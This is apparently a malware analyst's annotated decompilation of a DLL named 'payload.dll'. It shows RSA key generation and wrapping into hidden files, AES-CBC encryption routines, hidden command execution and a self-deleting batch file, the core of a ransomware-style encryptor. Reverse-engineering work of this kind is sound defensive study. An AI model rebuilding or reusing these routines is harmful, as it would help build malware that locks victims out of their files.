// payload.dll batch 5 — RSA/CryptoAPI key mgmt, AES-CBC engine, cmd exec

// ===== 0x10003cb0 sub_10003CB0 — CryptAcquireContext (RSA_AES provider) =====
BOOL __thiscall sub_10003CB0(HCRYPTPROV *this) {
  for (v1=0; v1<2; ++v1) {
    if (CryptAcquireContextA(this+1, nullptr, v1!=0 ? aMicrosoftEnhan : nullptr, PROV_RSA_AES(0x18), 0xF0000000))
      break;
    if (v1>=1) return 0;
  }
  return 1;
}
// vtable off_1000827C: this+1=hProv, this+2=hKey1(per-file RSA), this+3=hKey2(embedded/public), this+16=CRITICAL_SECTION

// ===== 0x10003e30 sub_10003E30 — load/import RSA key from file =====
int __thiscall sub_10003E30(HCRYPTPROV *this, LPCSTR lpFileName) {
  if (*(this+2)) { CryptDestroyKey(*(this+2)); *(this+2)=0; }
  return sub_10004130(*(this+1), this+2, lpFileName);
}

// ===== 0x10004130 sub_10004130 — ReadFile + CryptImportKey =====
int __cdecl sub_10004130(HCRYPTPROV hProv, HCRYPTKEY *phKey, LPCSTR lpFileName) {
  FileA = CreateFileA(lpFileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
  if (FileA==INVALID) return 0;
  v6 = GetFileSize(FileA,0);
  if (v6 <= 0x19000) {
    v8 = GlobalAlloc(0,v6);
    if (v8 && ReadFile(FileA,v8,v6,&n,0) && CryptImportKey(hProv,v8,n,0,0,phKey)) return 1;
  }
  return 0;
}

// ===== 0x10004570 sub_10004570 — CryptGenKey AT_KEYEXCHANGE 2048 =====
BOOL __cdecl sub_10004570(HCRYPTPROV hProv, HCRYPTKEY *phKey) {
  return CryptGenKey(hProv, AT_KEYEXCHANGE(1), 0x08000001u /*2048bit,exportable*/, phKey);
}

// ===== 0x10004270 sub_10004270 — export RSA key to file =====
int __cdecl sub_10004270(int a1, HCRYPTKEY hKey, DWORD dwBlobType, LPCSTR lpFileName) {
  CryptExportKey(hKey, 0, dwBlobType, 0, NULL, &pdwDataLen);
  v5 = GlobalAlloc(0, pdwDataLen);
  CryptExportKey(hKey, 0, dwBlobType, 0, v5, &pdwDataLen);
  FileA = CreateFileA(lpFileName, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0);
  WriteFile(FileA, v5, pdwDataLen, &n, 0);
  return 1;
}

// ===== 0x10004590 sub_10004590 — generate random AES key, RSA-encrypt it =====
BOOL __thiscall sub_10004590(int this, BYTE *pbBuffer, DWORD pdwDataLen, BYTE *pbData, DWORD *a5) {
  if (*(this+8)==0) return 0;
  if (!sub_10004640(this, pbBuffer, pdwDataLen)) return 0;
  if (pbData && a5) {
    qmemcpy(pbData, pbBuffer, pdwDataLen);
    EnterCriticalSection(this+16);
    ok = CryptEncrypt(*(this+8), 0, TRUE, 0, pbData, &pdwDataLen, *a5);
    LeaveCriticalSection(this+16);
    if (!ok) return 0;
    *a5 = pdwDataLen;
  }
  return 1;
}

// ===== 0x10003e70 sub_10003e70 — export RSA-private encrypted as .eky =====
// .eky format: [DWORD encLen][encBlob...] via sub_100043A0 (manual RSA chunking)
void *__thiscall sub_10003E70(int this, LPCSTR lpFileName) {
  if (!lpFileName) return 0;
  v3 = sub_100043A0(*(this+4), *(this+8), *(this+12), 7u /*PRIVATEKEYBLOB*/, &Buffer);
  if (v3) {
    v5 = CreateFileA(lpFileName, GENERIC_WRITE, FILE_SHARE_READ, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0);
    if (v5!=INVALID) { SetFilePointer(v5,0,0,FILE_END); WriteFile(v5,&Buffer,4,&n,0); WriteFile(v5,v3,Buffer,&n,0); }
    GlobalFree(v3); return (void*)(n==Buffer);
  }
}

// ===== 0x100043a0 sub_100043A0 — manual RSA export+chunk-encrypt =====
// Exports key blob, gets modulus size from CryptGetKeyParam KP_KEYLEN, splits into (mod-11) chunks,
// CryptEncrypt each chunk with hKey(a3=embedded public key), concatenates. Used for .eky private-key wrapping.
BYTE *__cdecl sub_100043A0(int a1, HCRYPTKEY hKey, HCRYPTKEY a3, DWORD dwBlobType, DWORD *pdwDataLen) { ... }

// ===== 0x10003f40 sub_10003F40 — validate .dky/.pky keypair by encrypt/decrypt "TESTDATA" =====
int __thiscall sub_10003F40(HCRYPTPROV *this, LPCSTR lpFileName, LPCSTR a3) {
  strcpy(Str2,"TESTDATA");
  if (!sub_10003CB0(this)) return 0;
  if (sub_10004130(prov,this+2,lpFileName)==0 || sub_10004130(prov,this+3,a3)==0) { cleanup; return 0; }
  strcpy(pbData,Str2);
  if (!CryptEncrypt(*(this+2),0,TRUE,0,pbData,&len,0x200) || !CryptDecrypt(*(this+3),0,TRUE,0,pbData,&len)) { cleanup; return 0; }
  if (strncmp(pbData,Str2,strlen(Str2))!=0) { sub_10003DE0(this); return 0; }
  return 1;
}

// ===== 0x10006270 sub_10006270 — AES key schedule (Rijndael) =====
// Supports 128/192/256-bit key & block. S-box byte_10008AAC, Rcon at unk_1000BCAC.
// Generates enc round keys at this+8 (32 bytes * (rounds+1)), dec round keys at this+488.
// Stores IV at this+1008, original IV at this+976, keylen at 968, blocksize 972, rounds 1040.

// ===== 0x10006AF0 sub_10006AF0 — AES block encrypt (16-byte fast path sub_10006730) =====
int __thiscall sub_10006AF0(int this, unsigned __int8 *a2, _BYTE *a3) {
  if ( *(this+972)==16 ) return sub_10006730(a2,a3);  // optimized 128-bit
  // generic Rijndael rounds using T-tables dword_10008CAC/100090AC/100098AC/100094AC and S-box byte_10008AAC
}

// ===== 0x10006730 sub_10006730 — AES-128 block encrypt =====
// 10 rounds, round keys at this+8, T-tables, final round uses S-box only.

// ===== 0x10006DF0 sub_10006DF0 — AES-CBC/CFB/ECB mode driver =====
// a5==1: CBC encrypt (XOR plaintext with IV/cipher, AES encrypt, IV=cipher)
// a5==2: CFB encrypt
// else: ECB encrypt

// ===== 0x10001000 sub_10001000 — CreateProcess hidden, optional wait =====
int __cdecl sub_10001000(LPSTR lpCommandLine, int a2, LPDWORD lpExitCode) {
  StartupInfo.cb=68; StartupInfo.dwFlags=STARTF_USESHOWWINDOW; StartupInfo.wShowWindow=SW_HIDE;
  if (!CreateProcessA(NULL, lpCommandLine, ..., CREATE_NO_WINDOW(0x8000000), ..., &si, &pi)) return 0;
  if (a2) { WaitForSingleObject(pi.hProcess, INFINITE); if (lpExitCode) GetExitCodeProcess(...); }
  CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return 1;
}

// ===== 0x100010B0 sub_100010B0 — write+exec temp .bat =====
FILE *__cdecl sub_100010B0(const char *a1) {
  srand(GetTickCount()); sprintf(Buffer,"%d%d.bat",rand(),time(0));
  v4=fopen(Buffer,"w"); if(v4){ fprintf(v4,"%s\ndel /a %%0\n",a1); fclose(v4); return sub_10001000(Buffer,1,0); }
}
